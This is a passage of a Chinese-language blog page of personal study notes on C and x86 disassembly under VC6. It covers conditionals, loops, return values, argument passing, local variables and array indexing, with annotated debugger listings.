0040107D</span><br><span class=\"line\">00401070  |&gt;  68 1C304200   push    0042301C                         ; /format = &quot;sb&quot;</span><br><span class=\"line\">00401075  |.  E8 D6030000   call    printf                           ; \\printf</span><br><span class=\"line\">0040107A  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">0040107D  |&gt;  33C0          xor     eax,eax</span><br><span class=\"line\">0040107F  |.  5F            pop     edi</span><br><span class=\"line\">00401080  |.  5E            pop     esi</span><br><span class=\"line\">00401081  |.  5B            pop     ebx</span><br><span class=\"line\">00401082  |.  83C4 44       add     esp,0x44</span><br><span class=\"line\">00401085  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">00401087  |.  E8 44040000   call    _chkesp</span><br><span class=\"line\">0040108C  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040108E  |.  5D            pop     ebp</span><br><span class=\"line\">0040108F  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>C 语言没有 bool，C++ 才有</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (x = 0)   //不执行</span><br><span class=\"line\">if (x = 2)   //执行</span><br><span class=\"line\">int a = 3;</span><br><span class=\"line\">if (a == 3)  //执行</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、将两个变量的值交换.</span><br><span class=\"line\">2、将一个数组中的数倒序输出.</span><br><span class=\"line\">3、找出数组里面最大的值，并返回</span><br><span class=\"line\">4、将数组所有的元素相加，将结果返回</span><br><span class=\"line\">5、将两个等长数组相同位置的值相加，存储到另外一个等长的数组中</span><br><span class=\"line\">6、写一个函数int prime(int x)，如果x是素数返回值为1，否则返回0。</span><br><span class=\"line\">7、俩俩比较数组的值，将最大的一个存储到数组的最后一个位置</span><br><span class=\"line\">8、编写程序实现一个冒泡排序的算法.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"循环语句\"><a class=\"markdownIt-Anchor\" href=\"#循环语句\">#</a> 循环语句</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">do...while   性能最高的循环</span><br><span class=\"line\">while </span><br><span class=\"line\">for</span><br><span class=\"line\"></span><br><span class=\"line\">int length = 10</span><br><span class=\"line\">int m = 0</span><br><span class=\"line\">int arr[10] = &#123;   &#125;</span><br><span class=\"line\">while (m &lt; length - 1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfor (int i = 1; i &lt; length-1-m;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tswap(arr[i],arr[i+1]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tm++;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>返回值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果返回值只有8位，使用al返回</span><br><span class=\"line\">ax</span><br><span class=\"line\">eax</span><br><span class=\"line\"></span><br><span class=\"line\">long long 在vc6中对应的是__int64</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 Function()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__int64 x = 0x1234567890;</span><br><span class=\"line\">\treturn x;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">00401020 &gt;/&gt; \\55                    push    ebp</span><br><span class=\"line\">00401021  |.  8BEC                  mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 48               sub     esp,0x48</span><br><span class=\"line\">00401026  |.  53                    push    ebx</span><br><span class=\"line\">00401027  |.  56                    push    esi</span><br><span class=\"line\">00401028  |.  57                    push    edi</span><br><span class=\"line\">00401029  |.  8D7D B8               lea     edi,[local.18]</span><br><span class=\"line\">0040102C  |.  B9 12000000           mov     ecx,0x12</span><br><span class=\"line\">00401031  |.  B8 CCCCCCCC           mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401036  |.  F3:AB                 rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401038  |.  C745 F8 90785634      mov     [local.2],0x34567890</span><br><span class=\"line\">0040103F  |.  C745 FC 12000000      mov     [local.1],0x12</span><br><span class=\"line\">00401046  |.  8B45 F8               mov     eax,[local.2]</span><br><span class=\"line\">00401049  |.  8B55 FC               mov     edx,[local.1]</span><br><span class=\"line\">0040104C  |.  5F                    pop     edi</span><br><span class=\"line\">0040104D  |.  5E                    pop     esi</span><br><span class=\"line\">0040104E  |.  5B                    pop     ebx</span><br><span class=\"line\">0040104F  |.  8BE5                  mov     esp,ebp</span><br><span class=\"line\">00401051  |.  5D                    pop     ebp</span><br><span class=\"line\">00401052  \\.  C3                    retn</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>参数传递</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void func(char a,char b,char c)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar a = 1,b=2,c=3;</span><br><span class=\"line\">\tfunc(a,b,c);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">0040D758  |.  C645 FC 01    mov     byte ptr ss:[ebp-0x4],0x1</span><br><span class=\"line\">0040D75C  |.  C645 F8 02    mov     byte ptr ss:[ebp-0x8],0x2</span><br><span class=\"line\">0040D760  |.  C645 F4 03    mov     byte ptr ss:[ebp-0xC],0x3</span><br><span class=\"line\">0040D764  |.  8A45 F4       mov     al,byte ptr ss:[ebp-0xC]</span><br><span class=\"line\">0040D767  |.  50            push    eax</span><br><span class=\"line\">0040D768  |.  8A4D F8       mov     cl,byte ptr ss:[ebp-0x8]</span><br><span class=\"line\">0040D76B  |.  51            push    ecx</span><br><span class=\"line\">0040D76C  |.  8A55 FC       mov     dl,byte ptr ss:[ebp-0x4]</span><br><span class=\"line\">0040D76F  |.  52            push    edx</span><br><span class=\"line\">0040D770  |.  E8 9A38FFFF   call    0040100F</span><br><span class=\"line\">0040D775  |.  83C4 0C       add     esp,0xC</span><br><span class=\"line\"></span><br><span class=\"line\">虽然定义的是char，但在压栈的时候还是会按照四字节的压，所以没法节约空间</span><br><span class=\"line\"></span><br><span class=\"line\">本机尺寸：本机32位，那么对32位的数据支持最好</span><br><span class=\"line\"></span><br><span class=\"line\">编译器遵守这个规则</span><br><span class=\"line\"></span><br><span class=\"line\">传输数据按照本机尺寸传，用还是按照原来大小用</span><br><span class=\"line\"></span><br><span class=\"line\">传参的时候如果是&lt;int的整数，一律使用int类型 </span><br><span class=\"line\"></span><br><span class=\"line\">参数传递的本质:将上层函数的变量，或者表达式的值“复制一份”，传递给下层函数.  可以理解为[ebp-4] 和 [ebp+8]的区别</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>局部变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">空函数会分配40h的缓冲区,如果使用局部变量会在40h的基础上增加，  只适用于vc6-debug</span><br><span class=\"line\"></span><br><span class=\"line\">void func()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar a = 1;</span><br><span class=\"line\">\tchar b = 2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">此时缓冲区分配了48，因为本机尺寸</span><br><span class=\"line\"></span><br><span class=\"line\">1、小于32位的局部变量，空间在分配时，按32位分配.</span><br><span class=\"line\">2、使用时按实际的宽度使用.</span><br><span class=\"line\">3、不要定义char/short类型的局部变量.</span><br><span class=\"line\">4、参数与局部变量没有本质区别，都是局部变量，都在栈中</span><br><span class=\"line\">5、完全可以把参数当初局部变量使用</span><br><span class=\"line\"></span><br><span class=\"line\">参数在执行前分配，局部变量在执行时分配，本质一样</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> a[<span class=\"number\">3</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;;</span><br><span class=\"line\"><span class=\"number\">0040</span>D740 &gt;/&gt; \\<span class=\"number\">55</span>            push    ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D741  |.  <span class=\"number\">8B</span>EC          mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D743  |.  <span class=\"number\">83</span>EC <span class=\"number\">44</span>       sub     esp,<span class=\"number\">0x44</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D746  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D747  |.  <span class=\"number\">56</span>            push    esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D748  |.  <span class=\"number\">57</span>            push    edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D749  |.  <span class=\"number\">8</span>D7D BC       lea     edi,[local<span class=\"number\">.17</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D74C  |.  B9 <span class=\"number\">11000000</span>   mov     ecx,<span class=\"number\">0x11</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D751  |.  B8 CCCCCCCC   mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D756  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D758  |.  C645 FC <span class=\"number\">01</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x4</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D75C  |.  C645 FD <span class=\"number\">02</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x3</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D760  |.  C645 FE <span class=\"number\">03</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x2</span>],<span class=\"number\">0x3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D764  |.  <span class=\"number\">5F</span>            pop     edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D765  |.  <span class=\"number\">5</span>E            pop     esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D766  |.  <span class=\"number\">5B</span>            pop     ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D767  |.  <span class=\"number\">8B</span>E5          mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D769  |.  <span class=\"number\">5</span>D            pop     ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D76A  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> a[<span class=\"number\">4</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>&#125;;</span><br><span class=\"line\"><span class=\"number\">0040</span>D740 &gt;/&gt; \\<span class=\"number\">55</span>            push    ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D741  |.  <span class=\"number\">8B</span>EC          mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D743  |.  <span class=\"number\">83</span>EC <span class=\"number\">44</span>       sub     esp,<span class=\"number\">0x44</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D746  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D747  |.  <span class=\"number\">56</span>            push    esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D748  |.  <span class=\"number\">57</span>            push    edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D749  |.  <span class=\"number\">8</span>D7D BC       lea     edi,[local<span class=\"number\">.17</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D74C  |.  B9 <span class=\"number\">11000000</span>   mov     ecx,<span class=\"number\">0x11</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D751  |.  B8 CCCCCCCC   mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D756  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D758  |.  C645 FC <span class=\"number\">01</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x4</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D75C  |.  C645 FD <span class=\"number\">02</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x3</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D760  |.  C645 FE <span class=\"number\">03</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x2</span>],<span class=\"number\">0x3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D764  |.  C645 FF <span class=\"number\">04</span>    mov     byte ptr ss:[ebp<span class=\"number\">-0x1</span>],<span class=\"number\">0x4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D768  |.  <span class=\"number\">5F</span>            pop     edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D769  |.  <span class=\"number\">5</span>E            pop     esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D76A  |.  <span class=\"number\">5B</span>            pop     ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D76B  |.  <span class=\"number\">8B</span>E5          mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D76D  |.  <span class=\"number\">5</span>D            pop     ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D76E  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">数组声明是需要常量来提升堆栈，使用时[]内可以是变量</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">char</span> i[<span class=\"number\">3</span>]  <span class=\"comment\">//缓冲区分配40+4</span></span><br><span class=\"line\"><span class=\"type\">char</span> i[<span class=\"number\">4</span>]  <span class=\"comment\">//缓冲区分配40+4</span></span><br><span class=\"line\"><span class=\"type\">short</span> i[<span class=\"number\">4</span>] <span class=\"comment\">//缓冲区分配40+4*2</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">//缓冲区分配是按照本机宽度位数的倍数分配的，参考char[3] 和 char[4]</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> x = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> y = <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> r;</span><br><span class=\"line\">    <span class=\"type\">int</span> arr[<span class=\"number\">10</span>] = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">    r = arr[<span class=\"number\">1</span>];</span><br><span class=\"line\">    r = arr[x];</span><br><span class=\"line\">    r = arr[x+y];</span><br><span class=\"line\">    r = arr[x*<span class=\"number\">2</span>+y];</span><br><span class=\"line\">&#125;    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D770 &gt;/&gt; \\<span class=\"number\">55</span>                  push    ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D771  |.  <span class=\"number\">8B</span>EC                mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D773  |.  <span class=\"number\">83</span>EC <span class=\"number\">74</span>             sub     esp,<span class=\"number\">0x74</span>        ;<span class=\"number\">0x74</span><span class=\"number\">-0x40</span>=<span class=\"number\">0x34</span>=<span class=\"number\">52</span>/<span class=\"number\">4</span>=<span class=\"number\">13</span> = <span class=\"number\">10</span> + <span class=\"number\">1</span> + <span class=\"number\">1</span> + <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D776  |.  <span class=\"number\">53</span>                  push    ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D777  |.  <span class=\"number\">56</span>                  push    esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D778  |.  <span class=\"number\">57</span>                  push    edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D779  |.  <span class=\"number\">8</span>D7D <span class=\"number\">8</span>C             lea     edi,[local<span class=\"number\">.29</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D77C  |.  B9 <span class=\"number\">1</span>D000000         mov     ecx,<span class=\"number\">0x1D</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D781  |.  B8 CCCCCCCC         mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D786  |.  F3:AB               rep     stos dword ptr es:[edi]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D788  |.  C745 FC <span class=\"number\">01000000</span>    mov     [local<span class=\"number\">.1</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D78F  |.  C745 F8 <span class=\"number\">02000000</span>    mov     [local<span class=\"number\">.2</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D796  |.  C745 CC <span class=\"number\">01000000</span>    mov     [local<span class=\"number\">.13</span>],<span class=\"number\">0x1</span>      ;低地址在上</span><br><span class=\"line\"><span class=\"number\">0040</span>D79D  |.  C745 D0 <span class=\"number\">02000000</span>    mov     [local<span class=\"number\">.12</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7A4  |.  C745 D4 <span class=\"number\">03000000</span>    mov     [local<span class=\"number\">.11</span>],<span class=\"number\">0x3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7AB  |.  C745 D8 <span class=\"number\">04000000</span>    mov     [local<span class=\"number\">.10</span>],<span class=\"number\">0x4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7B2  |.  C745 DC <span class=\"number\">05000000</span>    mov     [local<span class=\"number\">.9</span>],<span class=\"number\">0x5</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7B9  |.  C745 E0 <span class=\"number\">06000000</span>    mov     [local<span class=\"number\">.8</span>],<span class=\"number\">0x6</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7C0  |.  C745 E4 <span class=\"number\">07000000</span>    mov     [local<span class=\"number\">.7</span>],<span class=\"number\">0x7</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7C7  |.  C745 E8 <span class=\"number\">08000000</span>    mov     [local<span class=\"number\">.6</span>],<span class=\"number\">0x8</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7CE  |.  C745 EC <span class=\"number\">09000000</span>    mov     [local<span class=\"number\">.5</span>],<span class=\"number\">0x9</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7D5  |.  C745 F0 <span class=\"number\">00000000</span>    mov     [local<span class=\"number\">.4</span>],<span class=\"number\">0x0</span></span><br><span class=\"line\"></span><br><span class=\"line\">;    r = arr[<span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"number\">0040</span>D7DC  |.  <span class=\"number\">8B</span>45 D0             mov     eax,[local<span class=\"number\">.12</span>]                                ; 反汇编中写的是定值，直接取值</span><br><span class=\"line\"><span class=\"number\">0040</span>D7DF  |.  <span class=\"number\">8945</span> F4             mov     [local<span class=\"number\">.3</span>],eax                                 ;r = arr[<span class=\"number\">1</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">;    r = arr[x];</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E2  |.  <span class=\"number\">8B</span>4D FC             mov     ecx,[local<span class=\"number\">.1</span>]\t\t\t\t\t\t\t\t\t; ecx = <span class=\"number\">1</span>     <span class=\"number\">0x34</span> = <span class=\"number\">52</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7E5  |.  <span class=\"number\">8B</span>548D CC           mov     edx,dword ptr ss:[ebp+ecx*<span class=\"number\">4</span><span class=\"number\">-0x34</span>]             ; edx = <span class=\"number\">4</span><span class=\"number\">-34</span>=ebp<span class=\"number\">-0x30</span>=[local<span class=\"number\">.12</span>]=<span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7E9  |.  <span class=\"number\">8955</span> F4             mov     [local<span class=\"number\">.3</span>],edx\t\t\t\t\t\t\t\t\t; r = <span class=\"number\">2</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D7EC  |.  <span class=\"number\">8B</span>45 FC             mov     eax,[local<span class=\"number\">.1</span>]\t\t\t\t\t\t\t\t\t; <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7EF  |.  <span class=\"number\">0345</span> F8             add     eax,[local<span class=\"number\">.2</span>]\t\t\t\t\t\t\t\t\t; eax = <span class=\"number\">1</span>+<span class=\"number\">2</span> = <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7F2  |.  <span class=\"number\">8B</span>4C85 CC           mov     ecx,dword ptr ss:[ebp+eax*<span class=\"number\">4</span><span class=\"number\">-0x34</span>]\t\t\t\t; ecx = [ebp<span class=\"number\">-0x28</span>] = [local<span class=\"number\">.10</span>] = <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7F6  |.  <span class=\"number\">894</span>D F4             mov     [local<span class=\"number\">.3</span>],ecx\t\t\t\t\t\t\t\t\t; r = <span class=\"number\">4</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"number\">0040</span>D7F9  |.  <span class=\"number\">8B</span>55 FC             mov     edx,[local<span class=\"number\">.1</span>]\t\t\t\t\t\t\t\t\t; edx = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7FC  |.  <span class=\"number\">8B</span>45 F8             mov     eax,[local<span class=\"number\">.2</span>]\t\t\t\t\t\t\t\t\t; eax = <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7FF  |.  <span class=\"number\">8</span>D0C50              lea     ecx,dword ptr ds:[eax+edx*<span class=\"number\">2</span>]\t\t\t\t\t; ecx = <span class=\"number\">4</span></span><br><span 